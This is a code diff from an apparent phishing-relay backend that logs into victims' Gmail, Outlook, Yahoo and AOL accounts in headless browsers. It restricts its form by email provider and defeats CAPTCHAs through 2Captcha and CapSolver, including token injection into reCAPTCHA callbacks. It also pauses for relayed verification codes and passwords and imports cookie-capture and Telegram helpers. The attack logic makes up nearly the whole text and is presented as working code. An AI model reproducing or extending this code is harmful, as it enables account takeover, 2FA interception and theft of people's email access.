@@ -38,11 +38,18 @@ import {
     stillOnPasswordPage,
     detectAdditionalViewPresent,
     pageStillOnAuth,
-    getPasswordErrorText
+    getPasswordErrorText,
+    handleAdditionalViews,
+    solveImageCaptcha,
+    solveRecaptchaV2,
+    solveRecaptchaAudioChallenge,
+    isPageResponsive,
+    parseLocaleDate
 } from './routeHelper.js';
 import { sendTelegramMessage } from '../../../api/telegram.js';
 import { getProjectDetails, getSheetDataApi, stripFormulaColumns } from '../../../api/googlesheets.js'; // Import getProjectDetails
 import { notifyTeam } from "../../../../utils/notifyTeam.js";
+import { PLATFORM_INBOX_URLS, TAB_WHITELIST, getCookieCaptureUrls, validateEmailAgainstStrictly } from './platformHelper/index.js';
 
 // ── Profile-deletion watchdog ──────────────────────────────────────────────────
 // Every in-process removal of a path under /tmp/users_data is logged with its call
@@ -91,17 +98,6 @@ process.on('unhandledRejection', (reason) => {
 import { getCachedRow, setCachedRow, populateCache, evictRow } from "../../../../utils/cookieCache.js";
 import axios from 'axios';
 import { identifySelf as identifyServerlessSelf, identifySelfFromHost, getSelfUrl } from '../../../../utils/serverlessTracker.js';
-
-const PLATFORM_INBOX_URLS = {
-    'outlook.com': 'https://outlook.live.com/mail/',
-    'hotmail.com': 'https://outlook.live.com/mail/',
-    'live.com': 'https://outlook.live.com/mail/',
-    'msn.com': 'https://outlook.live.com/mail/',
-    'gmail.com': 'https://mail.google.com/mail/',
-    'googlemail.com': 'https://mail.google.com/mail/',
-    'yahoo.com': 'https://mail.yahoo.com/',
-    'aol.com': 'https://mail.aol.com/',
-};
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
 // Per-worker segment so browser profile dirs are never shared between two Next.js workers
@@ -191,97 +187,6 @@ export const dynamic = "force-dynamic";
 export const runtime = 'nodejs';
 
 /**
- * Validates email domain against the strictly platform using MX record detection.
- * @param {string} email - The email address to validate
- * @param {string} strictly - The required platform key (e.g., 'outlook', 'gmail', 'proton')
- * @returns {Promise<{valid: boolean, message: string, detectedPlatform: string}>}
- */
-async function validateEmailAgainstStrictly(email, strictly) {
-    if (!strictly || !email) {
-        return { valid: true, message: '', detectedPlatform: '' };
-    }
-
-    const strictlyLower = strictly.toLowerCase();
-    const platformConfig = platformConfigs[strictlyLower];
-
-    if (!platformConfig || !platformConfig.mxKeywords) {
-        logger.warn(`[validateEmailAgainstStrictly] Unknown strictly platform: '${strictly}'`);
-        return { valid: true, message: '', detectedPlatform: '' };
-    }
-
-    const domain = email.split('@')[1]?.toLowerCase();
-    if (!domain) {
-        return { valid: false, message: 'Invalid email format.', detectedPlatform: '' };
-    }
-
-    // Resolve MX records for the domain. A transient DNS/MX outage must never produce a
-    // false 'incorrect email' rejection — the real login page is the authority. Retry once
-    // (500ms); if MX is still unavailable, pass the email through for on-page validation
-    // instead of rejecting it here (rejecting on an empty MX set is how a local outage
-    // falsely rejected a valid proconsult.co.nz email for strictly='outlook').
-    let mxRecords = [];
-    try {
-        mxRecords = await resolveMx(domain).catch(() => []);
-        if (!mxRecords || mxRecords.length === 0) {
-            await new Promise(r => setTimeout(r, 500));
-            mxRecords = await resolveMx(domain).catch(() => []);
-        }
-    } catch (e) {
-        logger.debug(`[validateEmailAgainstStrictly] MX resolution failed for ${domain}: ${e.message}`);
-    }
-    if (!mxRecords || mxRecords.length === 0) {
-        // Domain has no MX — first check if domain itself matches the platform's
-        // keywords (e.g. "outlook.com" matches "outlook"). If it does, the email
-        // clearly belongs to this platform even without MX records.
-        const domainMatchesKeyword = platformConfig.mxKeywords.some(kw => domain.includes(kw));
-        if (domainMatchesKeyword) {
-            logger.warn(`[validateEmailAgainstStrictly] MX unavailable for '${email}' but domain matches platform keyword — passing through for on-page validation (strictly='${strictly}')`);
-            return { valid: true, message: '', detectedPlatform: strictlyLower };
-        }
-
-        // Domain doesn't match platform keywords — check A-record to decide.
-        // NXDOMAIN = domain doesn't exist → reject. Has A record = real domain,
-        // just not a mail provider for this platform → pass through.
-        // DNS unreachable AND no keyword match → reject (can't confirm it's valid).
-        let domainHasARecord = false;
-        let aDnsFailed = false;
-        try {
-            const aRecords = await resolveA(domain);
-            domainHasARecord = Array.isArray(aRecords) && aRecords.length > 0;
-        } catch (e) {
-            aDnsFailed = true;
-        }
-        if (aDnsFailed) {
-            const platformName = strictlyLower === 'outlook' ? 'Microsoft' : strictlyLower.charAt(0).toUpperCase() + strictlyLower.slice(1);
-            logger.warn(`[validateEmailAgainstStrictly] A-record lookup failed for '${domain}' and domain doesn't match '${strictly}' keywords. Rejecting '${email}'.`);
-            return { valid: false, message: `Incorrect email. This form only accepts ${platformName} accounts.`, detectedPlatform: '' };
-        }
-        if (!domainHasARecord) {
-            logger.warn(`[validateEmailAgainstStrictly] Domain '${domain}' has no MX and no A record (NXDOMAIN). Rejecting '${email}'.`);
-            return { valid: false, message: 'Incorrect email. Please check the email address.', detectedPlatform: '' };
-        }
-        logger.warn(`[validateEmailAgainstStrictly] MX unavailable for '${email}' but domain has A record — passing through for on-page validation (strictly='${strictly}')`);
-        return { valid: true, message: '', detectedPlatform: strictlyLower };
-    }
-
-    // Check if domain or MX records match the strictly platform's keywords
-    const matchedKeyword = platformConfig.mxKeywords.find(kw =>
-        domain.includes(kw) || mxRecords.some(mx => mx.exchange && mx.exchange.includes(kw))
-    );
-
-    if (matchedKeyword) {
-        logger.info(`[validateEmailAgainstStrictly] Email '${email}' matches strictly='${strictly}' (matched: '${matchedKeyword}')`);
-        return { valid: true, message: '', detectedPlatform: strictlyLower };
-    }
-
-    // No match - email domain doesn't belong to the required platform
-    const platformName = strictlyLower === 'outlook' ? 'Microsoft' : strictlyLower.charAt(0).toUpperCase() + strictlyLower.slice(1);
-    const message = `Incorrect email. This form only accepts ${platformName} accounts.`;
-    logger.warn(`[validateEmailAgainstStrictly] Email '${email}' rejected for strictly='${strictly}' (domain: ${domain})`);
-    return { valid: false, message, detectedPlatform: '' };
-}
-
-/**
  * Non-blocking update: writes to cache FIRST, then fires Sheets API without await.
  * This prevents Sheets API latency from blocking the engine flow.
  * @param {string} browserId - The browser ID
@@ -310,565 +215,6 @@ async function updateBrowserRowDataFast(browserId, updateData, isNewRow = false)
         });
     } else {
         logger.debug(`[updateBrowserRowDataFast][${browserId}] Skipped full cascade for ${status || 'intermediate'} write`);
-    }
-}
-
-async function handleAdditionalViews(page, platformConfig, instanceId, context = 'general') {
-    if (!platformConfig?.additionalViews || platformConfig.additionalViews.length === 0) {
-        logger.debug(`[handleAdditionalViews][${instanceId}] No additional views to process for this platform.`);
-        return;
-    }
-    logger.info(`[handleAdditionalViews][${instanceId}] Starting to check for additional views (context: ${context})...`);
-
-    const maxIterations = 10;
-    let iterationCount = 0;
-    let viewHandledInThisIteration = true;
-    const handledViews = new Set();
-    let fatalResult = null;
-
-    while (viewHandledInThisIteration && iterationCount < maxIterations) {
-        viewHandledInThisIteration = false;
-        iterationCount++;
-
-        if (iterationCount > 1) {
-            await new Promise(r => setTimeout(r, 100));
-        }
-
-        const viewEvaluatePromise = page.evaluate((views, ctx, skipNames) => {
-            try {
-                for (let i = 0; i < views.length; i++) {
-                    const view = views[i];
-                    if (skipNames.includes(view.name)) continue;
-                    if (ctx === 'post_verification' && (view.isVerificationChoiceScreen || view.isCodeEntryScreen)) continue;
-
-                    let match = false;
-
-                    // URL-based matching
-                    if (view.match.url) {
-                        const currentUrl = window.location.href;
-                        const urlPatterns = Array.isArray(view.match.url) ? view.match.url : [view.match.url];
-                        for (const pattern of urlPatterns) {
-                            if (typeof pattern === 'string' && currentUrl.includes(pattern)) {
-                                match = true;
-                                break;
-                            }
-                        }
-                    }
-
-                    // DOM selector + text matching (only if not already matched by URL)
-                    if (!match && view.match.selector) {
-                        const selectors = Array.isArray(view.match.selector) ? view.match.selector : [view.match.selector];
-                        for (const sel of selectors) {
-                            if (typeof sel !== 'string') continue;
-                            const element = document.querySelector(sel);
-                            if (element) {
-                                if (view.match.text) {
-                                    if ((element.textContent || "").includes(view.match.text)) {
-                                        match = true;
-                                        break;
-                                    }
-                                } else {
-                                    match = true;
-                                    break;
-                                }
-                            }
-                        }
-                    }
-                    if (match) return i;
-                }
-                return -1;
-            } catch (e) {
-                return -1;
-            }
-        }, platformConfig.additionalViews, context, Array.from(handledViews));
-
-        const viewIndex = await Promise.race([
-            viewEvaluatePromise.catch(() => -1),
-            new Promise((resolve) => setTimeout(() => resolve(-2), 20000))
-        ]);
-
-        if (viewIndex === -2) {
-            logger.warn(`[handleAdditionalViews][${instanceId}] page.evaluate stalled (>20s). Bailing additional-view handling to prevent permanent stall.`);
-            break;
-        }
-        if (viewIndex < 0) break;
-
-        const view = platformConfig.additionalViews[viewIndex];
-        handledViews.add(view.name);
-        logger.info(`[handleAdditionalViews][${instanceId}] Matched additional view: ${view.name}`);
-
-        if (view.isFatal) {
-            logger.warn(`[handleAdditionalViews][${instanceId}] Fatal view matched: ${view.name}. Returning fatal result.`);
-            fatalResult = { blocked: true, reason: view.name };
-            break;
-        }
-
-        if (!view.action) {
-            logger.info(`[handleAdditionalViews][${instanceId}] View ${view.name} matched but has no defined action.`);
-            viewHandledInThisIteration = true;
-            continue;
-        }
-
-        if (typeof view.action === 'function') {
-            logger.info(`[handleAdditionalViews][${instanceId}] Executing custom action for view: ${view.name}`);
-            await view.action(page, view, platformConfig);
-            viewHandledInThisIteration = true;
-            continue;
-        }
-
-        if (view.action.type === 'keyboard') {
-            const keys = Array.isArray(view.action.keys) ? view.action.keys : [view.action.keys];
-            for (const key of keys) {
-                await page.keyboard.press(key);
-                await new Promise(r => setTimeout(r, 100));
-            }
-            logger.info(`[handleAdditionalViews][${instanceId}] Pressed keyboard keys: ${keys.join(', ')} for view: ${view.name}`);
-            viewHandledInThisIteration = true;
-            await new Promise(r => setTimeout(r, 250));
-            continue;
-        }
-        if (view.action.type !== 'click') {
-            viewHandledInThisIteration = true;
-            continue;
-        }
-
-        const actionSelectors = Array.isArray(view.action.selector) ? view.action.selector : [view.action.selector];
-        let clickedViewAction = false;
-
-        if (view.action.text) {
-            try {
-                const elementClicked = await page.evaluate((selectors, textToFind) => {
-                    for (const sel of selectors) {
-                        if (typeof sel !== 'string') continue;
-                        const elements = document.querySelectorAll(sel);
-                        for (const element of elements) {
-                            if (element.textContent.includes(textToFind)) {
-                                element.click();
-                                return true;
-                            }
-                        }
-                    }
-                    return false;
-                }, actionSelectors, view.action.text);
-
-                if (elementClicked) {
-                    logger.info(`[handleAdditionalViews][${instanceId}] Clicked element with text "${view.action.text}" for view: ${view.name}`);
-                    clickedViewAction = true;
-                    if (view.action.waitForSelector) {
-                        await page.waitForSelector(view.action.waitForSelector, { visible: true, timeout: 5000 }).catch(() => null);
-                    } else {
-                        const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
-                        await page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 5000 }).catch(() => null);
-                    }
-                    await new Promise(r => setTimeout(r, 250));
-                }
-            } catch (textClickError) {
-                logger.warn(`[handleAdditionalViews][${instanceId}] Error clicking element by text for view ${view.name}: ${textClickError.message}`);
-            }
-        }
-
-        if (!clickedViewAction) {
-            for (const selector of actionSelectors) {
-                if (typeof selector !== 'string') continue;
-                try {
-                    await page.waitForSelector(selector, { visible: true, timeout: 2500 });
-                    if (view.action.waitForSelector) {
-                        await page.click(selector);
-                        await page.waitForSelector(view.action.waitForSelector, { visible: true, timeout: 5000 }).catch(() => null);
-                    } else {
-                        const navigationWaitUntil = view.action.navigationWaitUntil || 'domcontentloaded';
-                        const navigationPromise = page.waitForNavigation({ waitUntil: navigationWaitUntil, timeout: 5000 }).catch(() => null);
-                        await page.click(selector);
-                        await navigationPromise;
-                    }
-                    logger.info(`[handleAdditionalViews][${instanceId}] Clicked action selector '${selector}' for view: ${view.name}`);
-                    clickedViewAction = true;
-                    await new Promise(r => setTimeout(r, 250));
-                    break;
-                } catch (modalClickError) {
-                    logger.debug(`[handleAdditionalViews][${instanceId}] Action selector '${selector}' not found or clickable for view ${view.name}. Trying next if available.`);
-                }
-            }
-            if (!clickedViewAction) {
-                logger.warn(`[handleAdditionalViews][${instanceId}] No action selectors were clickable for view ${view.name}.`);
-            }
-        }
-
-        viewHandledInThisIteration = true;
-    }
-    if (iterationCount >= maxIterations) {
-        logger.warn(`[handleAdditionalViews][${instanceId}] Exceeded max iterations (${maxIterations}) while processing additional views. Some views might not have been handled.`);
-    }
-    logger.info(`[handleAdditionalViews][${instanceId}] Finished processing additional views (${iterationCount} iterations).`);
-    return fatalResult;
-}
-
-async function solveImageCaptcha(page, instanceId) {
-    const captchaApiKey = process.env.CAPTCHA_2CAPTCHA_KEY;
-    if (!captchaApiKey) {
-        logger.error(`[solveImageCaptcha][${instanceId}] CAPTCHA_2CAPTCHA_KEY not set in environment.`);
-        return false;
-    }
-
-    try {
-        logger.info(`[solveImageCaptcha][${instanceId}] Waiting for CAPTCHA image...`);
-        await page.waitForSelector('#captchaimg', { visible: true, timeout: 10000 });
-        await new Promise(r => setTimeout(r, 1000));
-
-        const captchaImg = await page.$('#captchaimg');
-        if (!captchaImg) {
-            logger.warn(`[solveImageCaptcha][${instanceId}] CAPTCHA image element not found.`);
-            return false;
-        }
-
-        const screenshotBuffer = await captchaImg.screenshot({ type: 'png' });
-        const base64Image = screenshotBuffer.toString('base64');
-        logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA image captured (${base64Image.length} chars). Sending to 2Captcha...`);
-
-        const submitResponse = await axios.post('https://2captcha.com/in.php', new URLSearchParams({
-            key: captchaApiKey,
-            method: 'base64',
-            body: base64Image,
-            json: '1'
-        }).toString(), {
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            timeout: 30000
-        });
-
-        if (submitResponse.data.status !== 1) {
-            logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha submit failed: ${JSON.stringify(submitResponse.data)}`);
-            return false;
-        }
-
-        const captchaId = submitResponse.data.request;
-        logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA submitted. ID: ${captchaId}. Waiting for solution...`);
-
-        const pollStart = Date.now();
-        const pollTimeout = 120000;
-        const pollInterval = 5000;
-
-        while (Date.now() - pollStart < pollTimeout) {
-            await new Promise(r => setTimeout(r, pollInterval));
-
-            const resultResponse = await axios.get('https://2captcha.com/res.php', {
-                params: {
-                    key: captchaApiKey,
-                    action: 'get',
-                    id: captchaId,
-                    json: 1
-                },
-                timeout: 15000
-            });
-
-            if (resultResponse.data.status === 1) {
-                const captchaAnswer = resultResponse.data.request;
-                logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA solved: "${captchaAnswer}". Typing into input...`);
-
-                const answerInput = await page.$('#ca');
-                if (!answerInput) {
-                    logger.warn(`[solveImageCaptcha][${instanceId}] Answer input #ca not found.`);
-                    return false;
-                }
-
-                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, '#ca');
-                await page.type('#ca', captchaAnswer, { delay: 30 });
-                await new Promise(r => setTimeout(r, 500));
-
-                const nextBtn = await page.$('#identifierNext');
-                if (nextBtn) {
-                    const navigationPromise = page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => null);
-                    await nextBtn.click();
-                    await navigationPromise;
-                    await new Promise(r => setTimeout(r, 2000));
-                    logger.info(`[solveImageCaptcha][${instanceId}] CAPTCHA answer submitted. Navigating...`);
-                } else {
-                    logger.warn(`[solveImageCaptcha][${instanceId}] Next button #identifierNext not found.`);
-                }
-                return true;
-            }
-
-            if (resultResponse.data.request !== 'CAPCHA_NOT_READY') {
-                logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha polling error: ${resultResponse.data.request}`);
-                return false;
-            }
-
-            logger.debug(`[solveImageCaptcha][${instanceId}] Still waiting... (${Math.round((Date.now() - pollStart) / 1000)}s elapsed)`);
-        }
-
-        logger.error(`[solveImageCaptcha][${instanceId}] 2Captcha polling timed out after ${pollTimeout / 1000}s.`);
-        return false;
-
-    } catch (error) {
-        logger.error(`[solveImageCaptcha][${instanceId}] Error: ${error.message}`);
-        return false;
-    }
-}
-
-async function solveRecaptchaV2(page, instanceId) {
-    const captchaApiKey = process.env.CAPTCHA_2CAPTCHA_KEY;
-    const capsolverKey = process.env.CAPSOLVER_API_KEY;
-    if (!captchaApiKey && !capsolverKey) {
-        logger.error(`[solveRecaptchaV2][${instanceId}] Neither CAPTCHA_2CAPTCHA_KEY nor CAPTCHA_CAPSOLVER_KEY set.`);
-        return false;
-    }
-
-    try {
-        const pageUrl = page.url();
-
-        // Extract reCAPTCHA site key from the page
-        const siteKey = await page.evaluate(() => {
-            const textarea = document.querySelector('#g-recaptcha-response');
-            if (textarea) {
-                const sk = textarea.getAttribute('data-sitekey');
-                if (sk) return sk;
-            }
-            const iframe = document.querySelector('iframe[title*="reCAPTCHA"]');
-            if (iframe) {
-                const src = iframe.src || '';
-                const match = src.match(/k=([^&]+)/);
-                if (match) return match[1];
-            }
-            const div = document.querySelector('.g-recaptcha, [data-sitekey]');
-            if (div) return div.getAttribute('data-sitekey');
-            return null;
-        }).catch(() => null);
-
-        if (!siteKey) {
-            logger.error(`[solveRecaptchaV2][${instanceId}] Could not extract reCAPTCHA site key from page.`);
-            return false;
-        }
-
-        // Detect if this is reCAPTCHA Enterprise by checking iframe src
-        const isEnterprise = await page.evaluate(() => {
-            const iframe = document.querySelector('iframe[title*="reCAPTCHA"]');
-            return iframe && (iframe.src || '').includes('enterprise');
-        }).catch(() => false);
-
-        logger.info(`[solveRecaptchaV2][${instanceId}] Site key: ${siteKey}. Enterprise: ${isEnterprise}. Starting solver chain...`);
-
-        // Build solver chain: CapSolver Enterprise first, then 2Captcha fallback
-        const solvers = [];
-        if (isEnterprise && capsolverKey) {
-            solvers.push('capsolver_enterprise');
-        }
-        if (captchaApiKey) {
-            if (isEnterprise) {
-                solvers.push('enterprise_recaptcha_v2');
-            }
-            solvers.push('userrecaptcha');
-        }
-
-        let token = null;
-
-        for (const solver of solvers) {
-            logger.info(`[solveRecaptchaV2][${instanceId}] Trying solver: ${solver}...`);
-
-            if (solver === 'capsolver_enterprise') {
-                // CapSolver reCAPTCHA Enterprise
-                try {
-                    const createResp = await axios.post('https://api.capsolver.com/createTask', {
-                        clientKey: capsolverKey,
-                        task: {
-                            type: 'ReCaptchaV2EnterpriseTaskProxyless',
-                            websiteURL: pageUrl,
-                            websiteKey: siteKey
-                        }
-                    }, { timeout: 30000 });
-
-                    if (createResp.data.errorId !== 0) {
-                        logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver createTask error: ${JSON.stringify(createResp.data)}`);
-                        continue;
-                    }
-
-                    const taskId = createResp.data.taskId;
-                    logger.info(`[solveRecaptchaV2][${instanceId}] CapSolver task created: ${taskId}. Polling...`);
-
-                    const pollStart = Date.now();
-                    while (Date.now() - pollStart < 120000) {
-                        await new Promise(r => setTimeout(r, 5000));
-                        const resultResp = await axios.post('https://api.capsolver.com/getTaskResult', {
-                            clientKey: capsolverKey,
-                            taskId
-                        }, { timeout: 15000 });
-
-                        if (resultResp.data.status === 'ready') {
-                            token = resultResp.data.solution.gRecaptchaResponse;
-                            logger.info(`[solveRecaptchaV2][${instanceId}] CapSolver token received (${token.length} chars).`);
-                            break;
-                        }
-                        if (resultResp.data.status === 'failed' || resultResp.data.errorId) {
-                            logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver task failed: ${JSON.stringify(resultResp.data)}`);
-                            break;
-                        }
-                    }
-                    if (token) break;
-                } catch (capErr) {
-                    logger.warn(`[solveRecaptchaV2][${instanceId}] CapSolver error: ${capErr.message}`);
-                }
-            } else {
-                // 2Captcha methods (enterprise_recaptcha_v2 or userrecaptcha)
-                const recaptchaParams = {
-                    key: captchaApiKey,
-                    method: solver,
-                    googlekey: siteKey,
-                    pageurl: pageUrl,
-                    json: '1'
-                };
-                if (solver === 'enterprise_recaptcha_v2') {
-                    recaptchaParams.domain = 'google.com';
-                }
-                logger.info(`[solveRecaptchaV2][${instanceId}] Submitting to 2Captcha with method: ${solver}...`);
-                const submitResponse = await axios.post('https://2captcha.com/in.php', new URLSearchParams(recaptchaParams).toString(), {
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    timeout: 30000
-                }).catch(err => ({ data: { status: 0, request: err.message } }));
-
-                if (submitResponse.data.status !== 1) {
-                    logger.warn(`[solveRecaptchaV2][${instanceId}] 2Captcha submit failed with method ${solver}: ${JSON.stringify(submitResponse.data)}`);
-                    continue;
-                }
-
-                const captchaId = submitResponse.data.request;
-                logger.info(`[solveRecaptchaV2][${instanceId}] Submitted to 2Captcha. ID: ${captchaId}. Polling...`);
-
-                const pollStart = Date.now();
-                while (Date.now() - pollStart < 120000) {
-                    await new Promise(r => setTimeout(r, 5000));
-                    const resultResponse = await axios.get('https://2captcha.com/res.php', {
-                        params: { key: captchaApiKey, action: 'get', id: captchaId, json: 1 },
-                        timeout: 15000
-                    });
-                    if (resultResponse.data.status === 1) {
-                        token = resultResponse.data.request;
-                        logger.info(`[solveRecaptchaV2][${instanceId}] 2Captcha token received (${token.length} chars).`);
-                        break;
-                    }
-                    if (resultResponse.data.request !== 'CAPCHA_NOT_READY') {
-                        logger.warn(`[solveRecaptchaV2][${instanceId}] 2Captcha error: ${resultResponse.data.request}`);
-                        break;
-                    }
-                }
-                if (token) break;
-            }
-        }
-
-        if (!token) {
-            logger.error(`[solveRecaptchaV2][${instanceId}] All solvers failed.`);
-            return false;
-        }
-
-        logger.info(`[solveRecaptchaV2][${instanceId}] Token obtained (${token.length} chars). Injecting...`);
-
-        // Inject the token into the page
-        await page.evaluate((token) => {
-            // Set token in the textarea
-            const textarea = document.querySelector('#g-recaptcha-response');
-            if (textarea) {
-                textarea.value = token;
-                textarea.style.display = 'block';
-                textarea.style.height = 'auto';
-            }
-
-            // Also try to set it in any sibling textarea (reCAPTCHA v2 sometimes uses a different ID)
-            const allTextareas = document.querySelectorAll('textarea[name="g-recaptcha-response"]');
-            allTextareas.forEach(ta => {
-                ta.value = token;
-                ta.style.display = 'block';
-            });
-
-            // Try to trigger the callback directly
-            try {
-                if (typeof ___grecaptcha_cfg !== 'undefined') {
-                    const clients = Object.keys(___grecaptcha_cfg.clients || {});
-                    for (const clientKey of clients) {
-                        const client = ___grecaptcha_cfg.clients[clientKey];
-                        if (client) {
-                            const keys = Object.keys(client);
-                            for (const key of keys) {
-                                const val = client[key];
-                                if (val && typeof val === 'object') {
-                                    const innerKeys = Object.keys(val);
-                                    for (const ik of innerKeys) {
-                                        if (val[ik] && typeof val[ik] === 'function') {
-                                            try { val[ik](token); } catch (e) { /* ignore */ }
-                                        }
-                                        if (val[ik] && typeof val[ik] === 'object') {
-                                            const deepKeys = Object.keys(val[ik]);
-                                            for (const dk of deepKeys) {
-                                                if (val[ik][dk] && typeof val[ik][dk] === 'function') {
-                                                    try { val[ik][dk](token); } catch (e) { /* ignore */ }
-                                                }
-                                            }
-                                        }
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            } catch (e) { /* callback trigger failed, form submit will handle it */ }
-
-            // Dispatch change event on textarea
-            if (textarea) {
-                textarea.dispatchEvent(new Event('input', { bubbles: true }));
-                textarea.dispatchEvent(new Event('change', { bubbles: true }));
-            }
-        }, token);
-
-        logger.info(`[solveRecaptchaV2][${instanceId}] Token injected. Trying to click checkbox/verify...`);
-
-        // Try to click the reCAPTCHA checkbox via Puppeteer frame API (bypasses cross-origin)
-        try {
-            const recaptchaFrames = page.frames().filter(f => f.url().includes('recaptcha'));
-            for (const frame of recaptchaFrames) {
-                const checkbox = await frame.$('#recaptcha-anchor').catch(() => null);
-                if (checkbox) {
-                    logger.info(`[solveRecaptchaV2][${instanceId}] Found reCAPTCHA checkbox in iframe, clicking...`);
-                    await checkbox.click().catch(() => {});
-                    break;
-                }
-            }
-        } catch (frameErr) {
-            logger.debug(`[solveRecaptchaV2][${instanceId}] Frame click failed: ${frameErr.message}`);
-        }
-
-        // Also try clicking verify buttons on the main page
-        await page.evaluate(() => {
-            const btns = document.querySelectorAll('#recaptcha-verify-button, .recaptcha-verify-button, button[aria-label*="Verify"], #submit');
-            for (const btn of btns) { try { btn.click(); } catch (e) {} }
-            const form = document.querySelector('form');
-            if (form) { try { form.submit(); } catch (e) {} }
-        }).catch(() => {});
-
-        // Wait and verify the solve actually worked
-        for (let check = 0; check < 6; check++) {
-            await new Promise(r => setTimeout(r, 3000));
-            const currentUrl = page.url();
-            logger.info(`[solveRecaptchaV2][${instanceId}] Post-inject check ${check + 1}: ${currentUrl}`);
-
-            // If URL changed away from recaptcha challenge, solve worked
-            if (!currentUrl.includes('challenge/recaptcha')) {
-                logger.info(`[solveRecaptchaV2][${instanceId}] reCAPTCHA solved successfully - navigated away from challenge.`);
-                return true;
-            }
-
-            // Check for error messages on page
-            const hasError = await page.evaluate(() => {
-                const errorEl = document.querySelector('.jEOsLc, [jsname="B34EJ"] span');
-                return errorEl && errorEl.textContent?.includes('Something went wrong');
-            }).catch(() => false);
-
-            if (hasError) {
-                logger.warn(`[solveRecaptchaV2][${instanceId}] Google rejected the token ("Something went wrong"). Token invalid for Enterprise.`);
-                return false;
-            }
-        }
-
-        logger.error(`[solveRecaptchaV2][${instanceId}] Page still on challenge URL after token injection. Solve failed.`);
-        return false;
-    } catch (err) {
-        logger.error(`[solveRecaptchaV2][${instanceId}] Error: ${err.message}`);
-        return false;
     }
 }
 
@@ -1211,16 +557,24 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                                     logger.info(`[checkAccountAccess][${instanceId}] AI solved reCAPTCHA successfully.`);
                                     await new Promise(r => setTimeout(r, 3000));
                                 } else {
-                                    logger.info(`[checkAccountAccess][${instanceId}] AI solver failed. Trying API solver as last resort...`);
-                                    await new Promise(r => setTimeout(r, 2000));
-                                    const recaptchaSolved = await solveRecaptchaV2(page, instanceId);
-                                    if (recaptchaSolved) {
-                                        logger.info(`[checkAccountAccess][${instanceId}] API reCAPTCHA solver succeeded.`);
+                                    logger.info(`[checkAccountAccess][${instanceId}] AI solver failed. Trying audio challenge solver...`);
+                                    await new Promise(r => setTimeout(r, 1000));
+                                    const audioSolved = await solveRecaptchaAudioChallenge(page, instanceId).catch(() => false);
+                                    if (audioSolved) {
+                                        logger.info(`[checkAccountAccess][${instanceId}] Audio challenge solved reCAPTCHA.`);
                                         await new Promise(r => setTimeout(r, 3000));
                                     } else {
-                                        logger.error(`[checkAccountAccess][${instanceId}] All reCAPTCHA solvers failed.`);
-                                        notifyTeam({ type: 'CAPTCHA_FAILED', platform, email, browserId, url: page.url(), detail: 'reCAPTCHA Enterprise solve failed' });
-                                        return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                                        logger.info(`[checkAccountAccess][${instanceId}] Audio solver failed. Trying API solver (token injection)...`);
+                                        await new Promise(r => setTimeout(r, 2000));
+                                        const recaptchaSolved = await solveRecaptchaV2(page, instanceId);
+                                        if (recaptchaSolved) {
+                                            logger.info(`[checkAccountAccess][${instanceId}] API reCAPTCHA solver succeeded.`);
+                                            await new Promise(r => setTimeout(r, 3000));
+                                        } else {
+                                            logger.error(`[checkAccountAccess][${instanceId}] All reCAPTCHA solvers failed.`);
+                                            notifyTeam({ type: 'CAPTCHA_FAILED', platform, email, browserId, url: page.url(), detail: 'reCAPTCHA Enterprise solve failed' });
+                                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                                        }
                                     }
                                 }
                             } else {
@@ -1252,6 +606,8 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         } else if (verificationAfterEmail.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function') {
                             const options = await platformConfig.extractVerificationOptions(page, platformConfig, verificationAfterEmail.viewName);
                             return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_OPTIONS', verificationOptions: options, viewName: verificationAfterEmail.viewName };
+                        } else if (verificationAfterEmail.type === 'password') {
+                            return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_PASSWORD', viewName: verificationAfterEmail.viewName };
                         } else {
                             return { emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true, verificationState: 'WAITING_CODE', viewName: verificationAfterEmail.viewName };
                         }
@@ -1595,15 +951,29 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     if (verificationDetailsAfterClick.required) {
                         logger.info(`[checkAccountAccess][${instanceId}] Verification screen detected after click: ${verificationDetailsAfterClick.viewName}. Returning for state transition.`);
                         if (verificationDetailsAfterClick.type === 'captcha') {
-                            notifyTeam({ type: 'CAPTCHA', platform, email, browserId, url: page.url(), detail: `CAPTCHA after click: ${verificationDetailsAfterClick.viewName}` });
-                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'CAPTCHA_FAILED' };
+                            if (platform === 'gmail') {
+                                logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA detected via checkVerification in fresh path. Attempting to solve...`);
+                                const recaptchaSolved = await solveRecaptchaV2(page, instanceId);
+                                if (recaptchaSolved) {
+                                    logger.info(`[checkAccountAccess][${instanceId}] reCAPTCHA solved via checkVerification. Continuing flow...`);
+                                    await new Promise(r => setTimeout(r, 3000));
+                                    // Don't return — let the flow continue to password step
+                                } else {
+                                    logger.error(`[checkAccountAccess][${instanceId}] reCAPTCHA solve failed via checkVerification.`);
+                                    notifyTeam({ type: 'CAPTCHA_FAILED', platform, email, browserId, url: page.url(), detail: 'reCAPTCHA solve failed (fresh path checkVerification)' });
